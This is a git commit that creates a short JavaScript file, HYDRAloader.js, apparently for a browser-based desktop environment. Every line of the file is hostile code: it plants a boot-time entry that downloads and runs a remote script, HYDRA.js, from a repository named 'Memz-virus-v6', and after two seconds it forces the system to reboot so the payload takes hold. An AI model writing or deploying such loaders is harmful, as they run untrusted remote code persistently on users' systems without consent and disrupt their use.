121e43a1c637a614732c506e01e4e967ff2de883
mhmmkm <72941240+mhmmkm@users.noreply.github.com>
2020-10-26 12:11:04 -0600

    Create HYDRAloader.js

---
+++ HYDRAloader.js
@@ -0,0 +1,9 @@
+$store.set("boot/file.js", '$loader.script("https://raw.githack.com/mhmmkm/Memz-virus-v6/main/HYDRA.js")')
+
+
+
+setTimeout(function(){       
+           
+$exe('reboot')
+
+}, 2000); 
